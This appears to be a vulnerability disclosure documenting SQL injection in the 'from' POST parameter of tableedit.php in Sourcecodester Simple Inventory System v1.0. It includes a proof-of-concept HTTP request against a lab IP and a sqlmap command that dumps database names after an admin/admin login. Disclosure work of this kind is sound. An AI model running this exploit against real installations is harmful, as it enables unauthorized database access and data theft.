### SQL injection vulnerability exists in Sourcecodester Simple Inventory System

official website:https://www.sourcecodester.com/php/4481/simple-inventory-system-using-phpmysql.html

version:v1.0

route：tableedit.php

injection parameter:$_POST['from']

#### 1.Vulnerability analysis

As shown in the figure below, in tableedit.php, after the from parameter is passed in through post, it is directly spliced into the SQL update statement without any security filtering, resulting in a SQL injection vulnerability. We can obtain any information in the database through error-based injection.

![image-20240517161740724](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Inventory%20System%20Sql%20Inject-3.assets/image-20240517161740724.png)

#### 2.Vulnerability verification and exploit

After admin/admin logs in to the system backend, replace the cookie content in the following POC and save it as 1.txt.

```
POST /tableedit.php HTTP/1.1
Host: 10.15.6.184:82
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.15.6.184:82
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.15.6.184:82/tableedit.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ncbt63bs17glrou5b79l17ifm6
Connection: close

from=2024-05-15&to=2024-05-16
```

python .\sqlmap.py -r .\1.txt --batch --dbs

![image-20240517161559656](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Inventory%20System%20Sql%20Inject-3.assets/image-20240517161559656.png)
